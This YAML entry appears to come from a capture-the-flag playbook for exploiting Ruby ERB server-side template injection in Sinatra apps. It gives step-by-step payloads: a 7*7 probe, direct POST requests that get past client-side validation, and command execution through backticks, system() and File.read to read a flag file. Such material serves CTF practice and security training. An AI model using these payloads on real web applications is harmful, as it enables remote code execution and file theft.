name: ruby_erb_ssti
category: web
tags: [ssti, ruby, erb, sinatra, template_injection]
indicators:
  - "ERB.new() with user input"
  - "Sinatra web framework"
  - "Client-side validation only"
  - "Template rendering with user data"

tricks:
  - name: "Step 1: Identify ERB SSTI"
    when: "Found ERB.new() with user input"
    how: "Test with ERB expression"
    payload: |
      <%= 7*7 %>
      # If returns "49", SSTI confirmed

  - name: "Step 2: Bypass client-side validation"
    when: "Client-side JS blocks special chars"
    how: "Send request directly, bypassing JS"
    payload: |
      # Client validation only, server doesn't validate
      # Send POST request directly with curl or requests
      sentence=<%= `cat /app/flag.txt` %>

  - name: "Step 3: Execute commands"
    when: "SSTI confirmed"
    how: "Use backticks or system() in ERB"
    payload: |
      <%= `cat /app/flag.txt` %>
      <%= system('cat /app/flag.txt') %>
      <%= File.read('/app/flag.txt') %>

  - name: "Alternative: Read files"
    when: "Command execution blocked"
    how: "Use File or IO classes"
    payload: |
      <%= File.read('/app/flag.txt') %>
      <%= IO.read('/app/flag.txt') %>
